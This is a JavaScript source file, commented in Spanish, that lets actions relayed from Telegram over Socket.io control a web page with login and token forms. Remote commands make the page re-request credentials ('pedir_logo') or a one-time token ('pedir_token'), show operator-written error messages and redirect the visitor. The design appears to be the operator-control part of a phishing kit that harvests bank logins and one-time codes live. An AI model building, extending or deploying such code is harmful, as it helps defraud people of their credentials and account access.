/**
 * TELEGRAM EVENTS HANDLER
 * Maneja los eventos y acciones recibidas desde Telegram
 * Se integra con Socket.io para comunicación en tiempo real
 */

(function() {
    'use strict';

    // ===============================
    // ESTADO Y CONFIGURACIÓN
    // ===============================
    
    const TelegramEvents = {
        initialized: false,
        socket: null,
        
        /**
         * Inicializa el manejador de eventos
         */
        initialize: function() {
            if (this.initialized) {
                console.log('⚠️ TelegramEvents ya está inicializado');
                return;
            }

            console.log('🔧 Inicializando TelegramEvents...');
            
            // Asegurar que commonUtils esté inicializado
            if (window.commonUtils && !window.commonUtils.initialized) {
                window.commonUtils.initializeCommon();
            }

            // Obtener referencia al socket
            this.socket = window.socket;

            if (!this.socket) {
                console.warn('⚠️ Socket.io no está disponible aún, esperando...');
                // Intentar nuevamente después de un momento
                setTimeout(() => this.initialize(), 1000);
                return;
            }

            // Configurar listeners de eventos
            this.setupEventListeners();

            // Verificar acciones pendientes
            this.checkPendingActions();

            this.initialized = true;
            console.log('✅ TelegramEvents inicializado correctamente');
        },

        /**
         * Configura los listeners de eventos del socket
         */
        setupEventListeners: function() {
            if (!this.socket) return;

            console.log('📡 Configurando event listeners de TelegramEvents...');

            // El evento telegram_action ya se maneja en common.js
            // Aquí solo agregamos logging adicional si es necesario
            
            console.log('✅ Event listeners de TelegramEvents configurados');
        },

        /**
         * Maneja una acción recibida desde Telegram
         * @param {Object} data - Datos de la acción
         */
        handleTelegramAction: function(data) {
            console.log('⚙️ Procesando acción:', data.action);

            const { action, message, redirect, messageId } = data;

            // Almacenar información de la acción
            if (action) {
                sessionStorage.setItem('lastAction', action);
                sessionStorage.setItem('lastActionTime', new Date().toISOString());
            }

            if (messageId) {
                sessionStorage.setItem('lastMessageId', messageId);
            }

            // Manejar mensaje si existe
            if (message) {
                console.log('💬 Mensaje:', message);
                
                if (action && action.includes('error')) {
                    sessionStorage.setItem('errorMessage', message);
                } else {
                    sessionStorage.setItem('successMessage', message);
                }
            }

            // Manejar redirección si existe
            if (redirect) {
                this.handleRedirect(redirect, message);
            }
        },

        /**
         * Maneja una redirección
         * @param {string} url - URL de destino
         * @param {string} message - Mensaje opcional
         */
        handleRedirect: function(url, message = null) {
            console.log('↗️ Redirigiendo a:', url);

            // Mostrar loading durante la redirección
            if (window.commonUtils) {
                window.commonUtils.showLoading(message || 'Redirigiendo...');
            }

            // Ejecutar redirección con un pequeño delay
            setTimeout(() => {
                window.location.href = url;
            }, 500);
        },

        /**
         * Verifica si hay acciones pendientes al cargar la página
         */
        checkPendingActions: function() {
            const urlParams = new URLSearchParams(window.location.search);
            const action = urlParams.get('action');

            if (action) {
                console.log('🔍 Acción pendiente detectada:', action);
                this.processPendingAction(action);
            }

            // Verificar mensajes en sessionStorage
            const errorMessage = sessionStorage.getItem('errorMessage');
            const successMessage = sessionStorage.getItem('successMessage');

            if (errorMessage) {
                console.log('⚠️ Mensaje de error pendiente:', errorMessage);
                this.showPendingError(errorMessage);
                sessionStorage.removeItem('errorMessage');
            }

            if (successMessage) {
                console.log('✅ Mensaje de éxito pendiente:', successMessage);
                this.showPendingSuccess(successMessage);
                sessionStorage.removeItem('successMessage');
            }
        },

        /**
         * Procesa una acción pendiente
         * @param {string} action - Nombre de la acción
         */
        processPendingAction: function(action) {
            console.log('⚙️ [PENDING] Procesando acción:', action);

            switch (action) {
                case 'pedir_logo':
                    console.log('🔄 [PENDING] Limpiando formularios para nuevas credenciales');
                    // Limpiar formularios si existen
                    const forms = document.querySelectorAll('form');
                    forms.forEach(form => {
                        if (window.commonUtils && window.commonUtils.clearForm) {
                            window.commonUtils.clearForm(form);
                        }
                    });
                    break;

                case 'pedir_token':
                    console.log('🔄 [PENDING] Limpiando campos de token');
                    const tokenInputs = document.querySelectorAll('.token-input');
                    if (tokenInputs.length > 0) {
                        tokenInputs.forEach(input => input.value = '');
                        tokenInputs[0].focus();
                    }
                    break;

                case 'finalizar':
                    console.log('✅ [PENDING] Proceso finalizado');
                    break;

                default:
                    console.warn('⚠️ [PENDING] Acción desconocida:', action);
            }

            // Limpiar parámetros de URL
            const cleanUrl = window.location.pathname;
            window.history.replaceState({}, document.title, cleanUrl);
        },

        /**
         * Muestra un error pendiente
         * @param {string} message - Mensaje de error
         */
        showPendingError: function(message) {
            const errorAlert = document.querySelector('.login-alert') || 
                             document.querySelector('.error-message');

            if (errorAlert) {
                errorAlert.style.display = 'block';
                const textElement = errorAlert.querySelector('p') || errorAlert;
                textElement.textContent = message;
            } else if (window.commonUtils) {
                window.commonUtils.showError(message);
            }
        },

        /**
         * Muestra un mensaje de éxito pendiente
         * @param {string} message - Mensaje de éxito
         */
        showPendingSuccess: function(message) {
            if (window.commonUtils) {
                window.commonUtils.showSuccess(message);
            }
        },

        /**
         * Limpia el estado y storage
         */
        cleanup: function() {
            sessionStorage.removeItem('lastAction');
            sessionStorage.removeItem('lastActionTime');
            sessionStorage.removeItem('lastMessageId');
            sessionStorage.removeItem('errorMessage');
            sessionStorage.removeItem('successMessage');
            console.log('🧹 TelegramEvents limpiado');
        }
    };

    // ===============================
    // EXPORTAR A SCOPE GLOBAL
    // ===============================
    
    window.telegramEvents = TelegramEvents;

    // ===============================
    // AUTO-INICIALIZACIÓN
    // ===============================
    
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            TelegramEvents.initialize();
        });
    } else {
        TelegramEvents.initialize();
    }

    // Limpiar al salir
    window.addEventListener('beforeunload', () => {
        TelegramEvents.cleanup();
    });

})();